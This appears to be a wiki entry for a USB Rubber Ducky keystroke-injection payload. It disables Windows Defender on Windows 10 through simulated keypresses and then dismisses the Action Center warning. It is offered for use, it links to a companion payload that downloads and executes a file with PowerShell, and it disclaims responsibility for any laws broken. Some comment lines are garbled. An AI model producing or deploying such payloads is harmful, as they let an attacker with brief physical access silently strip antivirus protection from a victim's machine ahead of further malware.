A ducky script that disables Windows defender, then clears the action center prompt

NOTE: this is only tested on the windows 10 1607 build, AKA the anniversary edition.

Most older machines will probably need more delay

This can be combined with other scripts. 


Preview: https://www.youtube.com/watch?v=XTF0U5jN1us

when combined with [[Payload - Windows 10 : Download and execute file with Powershell]]**:** https://www.youtube.com/watch?v=r6vwQ6QJujg

```
REM turn off windows defender then clear action center
REM author:judge2020
REM You take responsibility for any laws you break with this, I simply point out the security flaw
REM
REM start of script
REM
REM let the HID enumerate
DELAY 2000
ESCAPE
DELAY 100
CONTROL ESCAPE
DELAY 100
STRING Windows Defender Settings
ENTER
DELAY 2000
REM why TAB and HOME?
TAB
DELAY 50
REM why TAB and HOME?HOME
DELAY 50
ALT F4
DELAY 3200
REM windows + a = ????
GUI a 
DELAY 500
ENTER
DELAY 100
GUI a
```